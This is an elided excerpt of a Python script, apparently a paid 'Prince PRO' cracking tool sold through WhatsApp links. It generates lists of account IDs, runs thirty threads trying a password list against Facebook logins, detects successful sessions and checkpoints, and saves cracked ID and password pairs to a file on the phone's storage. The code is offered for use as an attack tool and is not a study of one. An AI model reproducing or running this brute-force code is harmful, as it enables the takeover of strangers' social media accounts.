        ...
        #       chk()
                ...
                if x == ("sex"):
                        ...
                        if xd in ['1','01']:
                                ...
                                os.system(f'xdg-open https://chat.whatsapp.com/00971564382087');menu()
                        elif xd in ['7','07']:
                                os.system('https://chat.whatsapp.com/JvSx29SgcxB2ScAosnntdN');menu()
                        elif xd in ['8','08']:
                                os.system('https://www.facebook.com/profile.php?id=100075189761610');menu()
                        elif xd in ['0','00']:
                                exit(' Thanks for use 🥰 ')
                        else:
                        ...
                        linex()
                        url_wa = "https://chat.whatsapp.com/JvSx29SgcxB2ScAosnntdN"
                        name = input(" Enter your Name : ")
                        linex()
                        tks = ("Hi AYAN Sir, I Need To Buy Your Paid Prince PRO Tools Version 1.9.0 Premium Please Accept My Key To Premium :)\n\n Name :- "+name+"\n Key :- "+fkeyx)
...
def pak():
                ...
                for nmbr in range(limit):
                        ...
                        user.append(nmp)
                with tred(max_workers=30) as AYAN:     
                        clear()
                        tl = str(len(user))
...
def ffb(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write('\r\r\033[1;37m [AYAN-XD] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        if "c_user" in AYAN:
                                ...
                                print('\r\r\033[1;32m [AYAN-OK] %s | %s'%(ids,pas))
                                open('/sdcard/AYAN-OK.txt', 'a').write(ids+'|'+pas+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in AYAN:
                                if 'y' in pcp:
                                        print('\r\r\x1b[38;5;208m [AYAN-CP] '+ids+' | '+pas+'\033[1;97m')
                ...
                try:
                        ...
                        for pas in passlist:
                                ...
                                if 'session_key' in q:
                                        uid=str(q['uid'])
                                        try:
                                                okk=open('/sdcard/AYAN-OK.txt','r').read()
                                                if uid in okk:pass
                                                else:
                                                        print('\r\r\033[1;32m [AYAN-OK] '+uid+' | '+pas+'\033[1;97m')
                                                        open('/sdcard/AYAN-OK.txt','a').write(uid+'|'+pas+'\n')
                                                        oks.append(ids)
                                                        break
                                        except:
                                                print('\r\r\033[1;32m [AYAN-OK] '+uid+' | '+pas+'\033[1;97m')
